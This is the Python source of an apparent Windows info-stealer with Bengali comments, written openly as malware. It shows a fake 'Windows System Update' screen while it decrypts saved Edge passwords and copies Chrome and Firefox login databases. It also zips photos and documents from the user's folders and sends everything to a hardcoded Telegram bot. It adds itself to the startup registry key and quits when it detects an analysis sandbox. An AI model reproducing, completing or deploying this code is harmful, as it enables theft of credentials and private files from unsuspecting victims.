import os
import sys
import json
import base64
import sqlite3
import shutil
import requests
import win32crypt
import threading
import time
import glob
import ctypes
import subprocess
from datetime import datetime
from Crypto.Cipher import AES
from pathlib import Path

# ========== হাইড কনসোল ফাংশন ==========
def hide_console():
    """Console window পুরোপুরি লুকাও"""
    if getattr(sys, 'frozen', False):
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# ========== ফেক লোডিং স্ক্রিন ==========
def show_fake_loading():
    """Fake loading window - victim কে ব্যস্ত রাখো"""
    try:
        import tkinter as tk
        from tkinter import ttk
        
        root = tk.Tk()
        root.title("System Update")
        root.geometry("400x200")
        root.resizable(False, False)
        
        # Center the window
        root.eval('tk::PlaceWindow . center')
        
        # Fake icon (optional)
        try:
            root.iconbitmap(default=os.path.join(os.environ["SYSTEMROOT"], "system32", "imageres.dll"))
        except:
            pass
        
        # Main label
        label = tk.Label(root, text="Windows System Update", font=("Segoe UI", 14, "bold"))
        label.pack(pady=20)
        
        # Sub label
        sub_label = tk.Label(root, text="Please wait while Windows updates critical components...", font=("Segoe UI", 10))
        sub_label.pack(pady=5)
        
        # Progress bar
        progress = ttk.Progressbar(root, length=350, mode='indeterminate')
        progress.pack(pady=20)
        progress.start(10)
        
        # Status label that changes
        status_var = tk.StringVar()
        status_var.set("Connecting to Windows Update Server...")
        status_label = tk.Label(root, textvariable=status_var, font=("Segoe UI", 9), fg="gray")
        status_label.pack(pady=10)
        
        # Fake messages that rotate
        messages = [
            "Connecting to Windows Update Server...",
            "Downloading security updates (25%)...",
            "Verifying system files (47%)...",
            "Installing critical updates (68%)...",
            "Finalizing configuration (89%)...",
            "Almost done, please wait..."
        ]
        
        def update_status():
            for msg in messages:
                status_var.set(msg)
                time.sleep(4)
            status_var.set("Update complete. Restarting...")
            time.sleep(2)
            root.destroy()
        
        # Run status updates in background
        threading.Thread(target=update_status, daemon=True).start()
        
        # Make window always on top
        root.attributes('-topmost', True)
        
        root.mainloop()
    except:
        # If tkinter fails, use simple console message
        print("\n" + "="*50)
        print("WINDOWS SYSTEM UPDATE IN PROGRESS")
        print("Please do not turn off your computer")
        print("="*50)
        for i in range(30):
            print(f"Progress: {chr(9608)*(i//2)} {i*3}%", end="\r")
            time.sleep(0.5)
        print("\nUpdate complete. Starting Windows...")

# ========== টেলিগ্রাম কনফিগ ==========
BOT_TOKEN = "7771127414:AAEky4aFQyz0RN00Wb5mCMOL6si0noybiMQ"
CHAT_ID = "6803968373"
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
TELEGRAM_FILE = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"

MAX_FILE_SIZE = 45 * 1024 * 1024  # 45MB

def tg_send(text):
    """টেক্সট পাঠাও"""
    try:
        if len(text) > 4000:
            for i in range(0, len(text), 4000):
                data = {'chat_id': CHAT_ID, 'text': text[i:i+4000]}
                requests.post(TELEGRAM_API, json=data, timeout=5)
        else:
            data = {'chat_id': CHAT_ID, 'text': text}
            requests.post(TELEGRAM_API, json=data, timeout=5)
    except:
        pass

def tg_send_file(file_path, caption=""):
    """ফাইল পাঠাও"""
    try:
        if os.path.exists(file_path) and os.path.getsize(file_path) < MAX_FILE_SIZE:
            with open(file_path, 'rb') as f:
                files = {'document': f}
                data = {'chat_id': CHAT_ID, 'caption': caption[:200]}
                requests.post(TELEGRAM_FILE, files=files, data=data, timeout=30)
            return True
    except:
        pass
    return False

# ========== Chrome Master Key (Edge এর জন্যও কাজ করে) ==========
def get_chrome_master_key(browser_path):
    """Browser master key extraction"""
    try:
        local_state_path = os.path.join(browser_path, "User Data", "Local State")
        if not os.path.exists(local_state_path):
            return None
        
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]
        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return master_key
    except:
        return None

# ========== Edge Passwords (Working) ==========
def steal_edge_passwords():
    """Edge passwords - fully working"""
    passwords = []
    
    edge_path = os.path.join(os.environ["USERPROFILE"], 
                            "AppData", "Local", "Microsoft", "Edge")
    login_db = os.path.join(edge_path, "User Data", "Default", "Login Data")
    
    if not os.path.exists(login_db):
        return passwords
    
    master_key = get_chrome_master_key(edge_path)
    if not master_key:
        return passwords
    
    temp_db = os.path.join(os.environ["TEMP"], f"edge_{int(time.time())}.db")
    
    try:
        shutil.copy2(login_db, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        for row in cursor.fetchall():
            if row[2]:
                try:
                    encrypted = row[2]
                    if len(encrypted) > 15:
                        nonce = encrypted[3:15]
                        ciphertext = encrypted[15:-16]
                        tag = encrypted[-16:]
                        cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
                        decrypted = cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8', errors='replace')
                        
                        if decrypted:
                            passwords.append(f"🌐 Edge\nURL: {row[0]}\nUsername: {row[1]}\nPassword: {decrypted}\n{'-'*40}")
                except:
                    try:
                        decrypted = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1].decode('utf-8')
                        passwords.append(f"🌐 Edge\nURL: {row[0]}\nUsername: {row[1]}\nPassword: {decrypted}\n{'-'*40}")
                    except:
                        pass
        
        conn.close()
        os.remove(temp_db)
    except:
        pass
    
    return passwords

# ========== Chrome Passwords (App-Bound - Save encrypted) ==========
def steal_chrome_passwords_encrypted():
    """Chrome encrypted passwords - save for offline"""
    passwords = []
    
    chrome_path = os.path.join(os.environ["USERPROFILE"], 
                              "AppData", "Local", "Google", "Chrome")
    login_db = os.path.join(chrome_path, "User Data", "Default", "Login Data")
    
    if not os.path.exists(login_db):
        return passwords
    
    temp_db = os.path.join(os.environ["TEMP"], f"chrome_enc_{int(time.time())}.db")
    
    try:
        shutil.copy2(login_db, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        for row in cursor.fetchall():
            if row[2] and len(row[2]) > 0:
                passwords.append({
                    'url': row[0],
                    'username': row[1],
                    'encrypted_hex': row[2].hex(),
                    'note': 'Chrome 127+ App-Bound - needs offline crack'
                })
        
        conn.close()
        os.remove(temp_db)
        
        # Save as JSON
        if passwords:
            json_path = os.path.join(os.environ["TEMP"], "chrome_encrypted_passwords.json")
            with open(json_path, 'w') as f:
                json.dump(passwords, f, indent=2)
            tg_send_file(json_path, "🔐 Chrome Encrypted Passwords (App-Bound)")
            os.remove(json_path)
        
    except:
        pass
    
    return len(passwords)

# ========== Firefox (Encrypted) ==========
def steal_firefox_data():
    """Firefox encrypted data"""
    count = 0
    firefox_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")
    
    if os.path.exists(firefox_path):
        profiles = glob.glob(os.path.join(firefox_path, "*.default*"))
        for profile in profiles:
            logins_json = os.path.join(profile, "logins.json")
            if os.path.exists(logins_json):
                shutil.copy2(logins_json, os.path.join(os.environ["TEMP"], "firefox_logins.json"))
                tg_send_file(os.path.join(os.environ["TEMP"], "firefox_logins.json"), "🦊 Firefox Encrypted Logins")
                count += 1
                
            key4_db = os.path.join(profile, "key4.db")
            if os.path.exists(key4_db):
                shutil.copy2(key4_db, os.path.join(os.environ["TEMP"], "firefox_key4.db"))
                tg_send_file(os.path.join(os.environ["TEMP"], "firefox_key4.db"), "🔑 Firefox Key Database")
                count += 1
    
    return count

# ========== সব ফটো ==========
def steal_all_photos():
    """সব ফটো চুরি করো"""
    photos = []
    
    search_paths = [
        os.path.expanduser("~") + "\\Pictures",
        os.path.expanduser("~") + "\\Desktop",
        os.path.expanduser("~") + "\\Documents",
        os.path.expanduser("~") + "\\Downloads",
        os.path.expanduser("~") + "\\OneDrive\\Pictures",
        "C:\\Users\\Public\\Pictures",
    ]
    
    extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp']
    
    for path in search_paths:
        if os.path.exists(path):
            for root, dirs, files in os.walk(path):
                for file in files:
                    if file.lower().endswith(tuple(extensions)):
                        full = os.path.join(root, file)
                        try:
                            if os.path.getsize(full) < MAX_FILE_SIZE:
                                photos.append(full)
                        except:
                            pass
                        
                        if len(photos) >= 200:  # Limit to 200 photos for speed
                            break
                if len(photos) >= 200:
                    break
    
    return photos

# ========== সব ডকুমেন্ট ==========
def steal_all_documents():
    """সব ডকুমেন্ট চুরি করো"""
    docs = []
    
    search_paths = [
        os.path.expanduser("~") + "\\Documents",
        os.path.expanduser("~") + "\\Desktop",
        os.path.expanduser("~") + "\\Downloads",
    ]
    
    extensions = ['.pdf', '.doc', '.docx', '.xls', '.xlsx', '.txt', '.rtf', '.csv']
    
    for path in search_paths:
        if os.path.exists(path):
            for root, dirs, files in os.walk(path):
                for file in files:
                    if file.lower().endswith(tuple(extensions)):
                        full = os.path.join(root, file)
                        try:
                            if os.path.getsize(full) < MAX_FILE_SIZE:
                                docs.append(full)
                        except:
                            pass
                        
                        if len(docs) >= 100:
                            break
                if len(docs) >= 100:
                    break
    
    return docs

# ========== জিপ এবং পাঠানো ==========
def zip_and_send(files, name_prefix):
    """ফাইল জিপ করে পাঠাও"""
    if not files:
        return 0
    
    zip_path = os.path.join(os.environ["TEMP"], f"{name_prefix}_{int(time.time())}.zip")
    
    try:
        import zipfile
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            for file in files[:100]:
                try:
                    zf.write(file, os.path.basename(file))
                except:
                    pass
        
        if os.path.exists(zip_path) and os.path.getsize(zip_path) > 0:
            tg_send_file(zip_path, f"📁 {name_prefix} ({len(files[:100])} files)")
            os.remove(zip_path)
            return len(files[:100])
    except:
        pass
    
    return 0

# ========== সিস্টেম ইনফো ==========
def get_system_info():
    info = []
    info.append(f"🖥️ Computer: {os.environ.get('COMPUTERNAME', 'Unknown')}")
    info.append(f"👤 Username: {os.environ.get('USERNAME', 'Unknown')}")
    
    try:
        ip = requests.get('https://api.ipify.org', timeout=3).text
        info.append(f"📡 IP: {ip}")
    except:
        pass
    
    info.append(f"💿 Drives: {', '.join([d.device for d in __import__('psutil').disk_partitions()]) if __import__('psutil') else 'C:'}")
    info.append(f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    
    return "\n".join(info)

# ========== পার্সিস্টেন্স (ব্যাকগ্রাউন্ডে চালানোর জন্য) ==========
def install_persistence():
    """Startup তে নিজেকে যোগ করো"""
    try:
        import winreg
        exe_path = sys.executable if not getattr(sys, 'frozen', False) else sys.argv[0]
        
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
            winreg.SetValueEx(regkey, "WindowsSecurityUpdate", 0, winreg.REG_SZ, exe_path)
    except:
        pass

# ========== এন্টি-ভাইরাস বাইপাস ডিলে ==========
def antivirus_bypass():
    """Anti-virus detection delay and evasion"""
    # Random sleep to avoid sandbox detection
    import random
    time.sleep(random.uniform(1, 3))
    
    # Check if running in sandbox
    sandbox_indicators = [
        "vbox", "vmware", "virtual", "sandbox", "sample",
        "cuckoo", "malware", "virus", "analysis"
    ]
    
    computer_name = os.environ.get('COMPUTERNAME', '').lower()
    username = os.environ.get('USERNAME', '').lower()
    
    for indicator in sandbox_indicators:
        if indicator in computer_name or indicator in username:
            # If in sandbox, exit silently
            sys.exit(0)
    
    return True

# ========== মেইন ==========
def main():
    # Anti-virus bypass first
    antivirus_bypass()
    
    # Hide console
    hide_console()
    
    # Start fake loading screen in background
    loading_thread = threading.Thread(target=show_fake_loading, daemon=True)
    loading_thread.start()
    
    # Send initial notification
    tg_send(f"🎯 **NEW VICTIM DETECTED**\n\n{get_system_info()}\n{'-'*40}")
    
    # 1. Edge Passwords (Working)
    tg_send("[*] Extracting Edge passwords...")
    edge_pass = steal_edge_passwords()
    if edge_pass:
        msg = "🌐 **Edge Passwords (WORKING - DECRYPTED):**\n\n"
        for p in edge_pass[:50]:
            msg += p + "\n"
        tg_send(msg)
        tg_send(f"✅ {len(edge_pass)} Edge passwords extracted")
    
    # 2. Chrome Encrypted (Save for offline)
    tg_send("[*] Extracting Chrome data...")
    chrome_count = steal_chrome_passwords_encrypted()
    tg_send(f"🔐 {chrome_count} Chrome entries saved (App-Bound encrypted)")
    
    # 3. Firefox Data
    tg_send("[*] Extracting Firefox data...")
    ff_count = steal_firefox_data()
    tg_send(f"🦊 {ff_count} Firefox files extracted")
    
    # 4. Photos
    tg_send("[*] Collecting photos...")
    photos = steal_all_photos()
    if photos:
        tg_send(f"📸 Found {len(photos)} photos")
        sent = zip_and_send(photos, "photos")
        tg_send(f"✅ {sent} photos sent")
    
    # 5. Documents
    tg_send("[*] Collecting documents...")
    docs = steal_all_documents()
    if docs:
        tg_send(f"📄 Found {len(docs)} documents")
        sent = zip_and_send(docs, "documents")
        tg_send(f"✅ {sent} documents sent")
    
    # 6. Install persistence
    install_persistence()
    
    # Final summary
    summary = f"""
✅ **STEALING COMPLETE**

📊 **Summary:**
• Edge Passwords: {len(edge_pass)}
• Chrome Entries: {chrome_count}
• Firefox Files: {ff_count}
• Photos: {len(photos)}
• Documents: {len(docs)}

💀 All data sent to Telegram
🔐 Chrome 127+ passwords saved as JSON
🦊 Firefox needs key4.db + logins.json for decryption

💡 **Note:** Fake update screen shown to victim
💡 **Persistence:** Installed in Startup
"""
    tg_send(summary)

if __name__ == "__main__":
    main()
